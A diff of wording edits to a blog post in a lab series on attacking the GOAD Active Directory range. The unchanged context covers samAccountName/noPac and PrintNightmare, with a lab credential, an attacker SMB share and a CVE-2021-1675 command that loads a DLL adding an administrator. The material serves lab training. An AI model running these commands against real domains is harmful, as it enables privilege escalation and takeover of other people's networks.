@@ -5,8 +5,8 @@ category : AD
 tags :  AD, Lab, samaccountname, nopac, printnightmare
 ---
 
-On the previous post ([Goad pwning part4]({% link _posts/2022-07-12-GOADv2-pwning-part4.md %})) we played with relay ntlm.
-For this part we will continue on what to do with a valid account on the domain.
+In the previous post ([Goad pwning part4]({% link _posts/2022-07-12-GOADv2-pwning-part4.md %})) we played with relay ntlm.
+During this article we will continue to discover what can be done using a valid domain account
 
 ![account_on_domain.png](/assets/blog/GOAD/account_on_domain.png)
 
@@ -14,7 +14,7 @@ Here we will only try samAccountName exploit and PrintNightmare as MS14-068 is n
 
 ## SamAccountName (nopac)
 
-At the end of 2021 when everyone was worried about the log4j "log4shell" vulnerability another vulnerability raise up with less noise : CVE-2021-42287.
+In the end of 2021 when everyone was worried about the log4j "log4shell" vulnerability another vulnerability raise up with less noise : CVE-2021-42287.
 
 - I will not re-explain the vulnerability, as it is wonderfully describe here by Charlie Clark : [https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
 
@@ -23,7 +23,7 @@ At the end of 2021 when everyone was worried about the log4j "log4shell" vulnera
 
 - As a huge fan of linux and exegol we will try the linux way :)
 
-### Verify if we can add computer
+### Check if we can add computer
 
 For this attack i will use `north/jon.snow:iknownothing` account as we previously get it with kerberoasting in the part3.
 
@@ -87,7 +87,7 @@ git merge 1224
 rehash
 ```
 
-- Now let's verify we get all the binaries and options we want :
+- Now let's check we get all the binaries and options we want :
 
 ```shell
 renameMachine.py
@@ -184,7 +184,7 @@ Impacket v0.10.1.dev1+20220708.213759.8b1a99f7 - Copyright 2022 SecureAuth Corpo
 
 To exploit printnightmare we will first check if the spooler is active on targets
 
-### Verify spooler is active
+### Check spooler is active
 
 - With cme
 
@@ -269,7 +269,7 @@ smbserver.py -smb2support ATTACKERSHARE .
 ![pnightmare_before.png](/assets/blog/GOAD/pnightmare_before.png)
 
 - Try on Braavos
-  - Braavos is an uptodate windows server 2016, the exploit not work (same error if you try on the north domain on castelblack server)
+  - Braavos is an up-to-date windows server 2016, the exploit will not work (same error if you try on the north domain on castelblack server)
 
 ![printnightmare_error.png](/assets/blog/GOAD/printnightmare_error.png)
 
@@ -305,12 +305,12 @@ _"Domain controllers do not have built-in or account domains. Also, instead of a
 python3 CVE-2021-1675.py north.sevenkingdoms.local/jon.snow:'iknownothing'@north.sevenkingdoms.local '\\192.168.56.1\ATTACKERSHARE\nightmare.dll'
 ```
 
-- And it work too but the user is not in the administrators group :(
+- And it works too but the user is not in the administrators group :(
 - Nothing due to the exploit, it is just our dll who add a user as administrator who get caught when user is setup as administrator
 
 ![defender.png](/assets/blog/GOAD/defender.png)
 
-- And good think to know, after some failures the spooler service will be stopped by defender and no more exploit for you until someone restart the server or the spooler service.
+- Good (thing) to know : after some failures the spooler service will be stopped by defender and no more exploit for you until someone restart the server or the spooler service.
 
 
 - Let's change the payload with another code (source : https://github.com/newsoft/adduser )
